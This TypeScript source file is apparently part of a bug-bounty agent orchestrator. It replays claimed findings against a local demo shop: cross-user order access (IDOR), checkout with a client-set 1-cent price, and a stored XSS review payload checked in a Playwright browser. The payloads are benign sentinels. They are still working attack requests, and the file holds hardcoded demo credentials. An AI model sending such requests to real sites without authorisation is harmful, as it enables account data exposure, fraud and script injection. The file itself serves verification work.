/**
 * apps/server/src/orchestrator/replay-verifier.ts
 *
 * Independent Replay Verifier for BUGBOUNTY SWARM.
 * Does NOT trust agent-supplied booleans or self-reported evidence.
 * Directly executes fresh HTTP requests and Playwright browser sessions
 * to independently reproduce claimed vulnerabilities against the live target.
 */

import { chromium } from "playwright";

export interface ReplayVerificationResult {
  verified: boolean;
  reason: string;
  evidence?: Record<string, unknown>;
}

export class ReplayVerifier {
  private targetBase: string;

  constructor(targetBase: string = "http://localhost:4000/shop") {
    this.targetBase = targetBase.replace(/\/+$/, "");
  }

  /**
   * Replays IDOR / BOLA vulnerability:
   * 1. Logs in as Alice (alice@example.com).
   * 2. Logs in as Bob (bob@example.com).
   * 3. Fetches Bob's private orders to identify an order owned by Bob.
   * 4. Alice requests Bob's order using Alice's token.
   * 5. Confirms HTTP 200 and owner is actually 'user-bob'.
   */
  public async verifyIdorReplay(): Promise<ReplayVerificationResult> {
    try {
      // 1. Fresh login for Alice
      const aliceLoginRes = await fetch(`${this.targetBase}/api/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "alice@example.com", password: "Alice123!" }),
      });
      if (!aliceLoginRes.ok) {
        return { verified: false, reason: `Replay auth failed for Alice (HTTP ${aliceLoginRes.status})` };
      }
      const aliceData = (await aliceLoginRes.json()) as { token: string; user: { id: string } };

      // 2. Fresh login for Bob
      const bobLoginRes = await fetch(`${this.targetBase}/api/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "bob@example.com", password: "Bob123!" }),
      });
      if (!bobLoginRes.ok) {
        return { verified: false, reason: `Replay auth failed for Bob (HTTP ${bobLoginRes.status})` };
      }
      const bobData = (await bobLoginRes.json()) as { token: string; user: { id: string } };

      // 3. Get Bob's orders
      const bobOrdersRes = await fetch(`${this.targetBase}/api/orders`, {
        headers: { Authorization: `Bearer ${bobData.token}` },
      });
      if (!bobOrdersRes.ok) {
        return { verified: false, reason: `Failed to fetch Bob's orders (HTTP ${bobOrdersRes.status})` };
      }
      const bobOrders = (await bobOrdersRes.json()) as { id: string; userId: string }[];
      const targetOrder = bobOrders[0] || { id: "order-bob-001", userId: "user-bob" };

      // 4. Alice attempts cross-user access to Bob's order
      const crossRes = await fetch(`${this.targetBase}/api/orders/${targetOrder.id}`, {
        headers: { Authorization: `Bearer ${aliceData.token}` },
      });

      if (crossRes.status === 403 || crossRes.status === 401) {
        return {
          verified: false,
          reason: `Replay rejected: Access control enforced (HTTP ${crossRes.status}). Finding is NOT reproducible.`,
        };
      }

      if (crossRes.status === 200) {
        const orderBody = (await crossRes.json()) as { id: string; userId: string; total?: number; items?: unknown[] };
        if (orderBody.userId === bobData.user.id || orderBody.userId === "user-bob") {
          return {
            verified: true,
            reason: `Replay confirmed: Alice (${aliceData.user.id}) retrieved Bob's order (${orderBody.id}, owner: ${orderBody.userId}) with HTTP 200.`,
            evidence: {
              reproducedBy: "ReplayVerifier",
              testedEndpoint: `/shop/api/orders/${targetOrder.id}`,
              accessorUserId: aliceData.user.id,
              actualOwnerUserId: orderBody.userId,
              httpStatus: 200,
            },
          };
        }
      }

      return {
        verified: false,
        reason: `Replay failed: Unexpected HTTP status ${crossRes.status} or owner mismatch.`,
      };
    } catch (err) {
      return { verified: false, reason: `Replay error during IDOR test: ${(err as Error).message}` };
    }
  }

  /**
   * Replays Price Manipulation vulnerability:
   * 1. Logs in as Alice.
   * 2. Reads canonical catalog price for 'prod-001'.
   * 3. Submits checkout with manipulated price = 1 cent ($0.01).
   * 4. Checks if order was recorded at client-supplied price.
   */
  public async verifyPriceReplay(): Promise<ReplayVerificationResult> {
    try {
      // 1. Fresh login as Alice
      const loginRes = await fetch(`${this.targetBase}/api/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "alice@example.com", password: "Alice123!" }),
      });
      if (!loginRes.ok) {
        return { verified: false, reason: `Replay auth failed (HTTP ${loginRes.status})` };
      }
      const { token } = (await loginRes.json()) as { token: string };

      // 2. Get canonical product price
      const prodRes = await fetch(`${this.targetBase}/api/products/prod-001`);
      if (!prodRes.ok) {
        return { verified: false, reason: `Failed to fetch product prod-001 (HTTP ${prodRes.status})` };
      }
      const prod = (await prodRes.json()) as { id: string; price: number };
      const canonicalPrice = prod.price; // e.g. 7999 ($79.99)

      // 3. Post checkout with manipulated price = 1
      const checkoutRes = await fetch(`${this.targetBase}/api/checkout`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          items: [{ productId: "prod-001", quantity: 1, price: 1 }],
        }),
      });

      if (!checkoutRes.ok) {
        return {
          verified: false,
          reason: `Replay rejected: Server rejected manipulated checkout with HTTP ${checkoutRes.status}.`,
        };
      }

      const checkoutData = (await checkoutRes.json()) as {
        order?: { id: string; total: number; items: { priceAtPurchase: number }[] };
      };

      const chargedPrice = checkoutData.order?.items?.[0]?.priceAtPurchase;

      if (chargedPrice === 1 && canonicalPrice > 1) {
        return {
          verified: true,
          reason: `Replay confirmed: Server accepted client-supplied price ($0.01) instead of catalog price ($${(canonicalPrice / 100).toFixed(2)}).`,
          evidence: {
            reproducedBy: "ReplayVerifier",
            canonicalPrice,
            manipulatedPrice: 1,
            recordedPrice: chargedPrice,
            orderId: checkoutData.order?.id,
          },
        };
      }

      return {
        verified: false,
        reason: `Replay failed: Order was recorded at legitimate catalog price ($${((chargedPrice || 0) / 100).toFixed(2)}). Vulnerability not present.`,
      };
    } catch (err) {
      return { verified: false, reason: `Replay error during Price test: ${(err as Error).message}` };
    }
  }

  /**
   * Replays Stored XSS vulnerability:
   * 1. Logs in as Alice.
   * 2. Submits review with a unique sentinel payload.
   * 3. Launches a fresh Chromium browser (Playwright).
   * 4. Navigates to the product page.
   * 5. Checks if sentinel executed in the browser context.
   */
  public async verifyXssReplay(headless: boolean = true): Promise<ReplayVerificationResult> {
    let browser;
    try {
      // 1. Fresh login as Alice
      const loginRes = await fetch(`${this.targetBase}/api/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "alice@example.com", password: "Alice123!" }),
      });
      if (!loginRes.ok) {
        return { verified: false, reason: `Replay auth failed (HTTP ${loginRes.status})` };
      }
      const { token } = (await loginRes.json()) as { token: string };

      // 2. Submit unique sentinel payload
      const sentinelKey = `__replay_sentinel_${Date.now()}`;
      const payload = `<img src="x" onerror="window['${sentinelKey}']='REPLAY_EXECUTED'">`;

      const submitRes = await fetch(`${this.targetBase}/api/products/prod-001/reviews`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ content: payload, rating: 5 }),
      });

      if (!submitRes.ok) {
        return {
          verified: false,
          reason: `Replay rejected: Server rejected review submission (HTTP ${submitRes.status}).`,
        };
      }

      // 3. Launch fresh Chromium browser
      browser = await chromium.launch({ headless });
      const context = await browser.newContext();
      const page = await context.newPage();

      // 4. Navigate to product page where review is rendered
      await page.goto(`${this.targetBase}/products/prod-001`, { waitUntil: "domcontentloaded", timeout: 10000 });
      await page.waitForTimeout(1000);

      // 5. Evaluate execution in DOM context
      const executed = await page.evaluate((key) => {
        return (window as unknown as Record<string, unknown>)[key] === "REPLAY_EXECUTED";
      }, sentinelKey);

      await browser.close();
      browser = undefined;

      if (executed) {
        return {
          verified: true,
          reason: `Replay confirmed: Injected sentinel payload successfully executed in fresh Chromium DOM context.`,
          evidence: {
            reproducedBy: "ReplayVerifier",
            browser: "Chromium (Playwright)",
            sentinelKey,
            executed: true,
          },
        };
      }

      return {
        verified: false,
        reason: `Replay failed: Review was rendered with textContent/escaped. Sentinel JavaScript did NOT execute.`,
      };
    } catch (err) {
      if (browser) await browser.close().catch(() => {});
      return { verified: false, reason: `Replay error during XSS test: ${(err as Error).message}` };
    }
  }
}
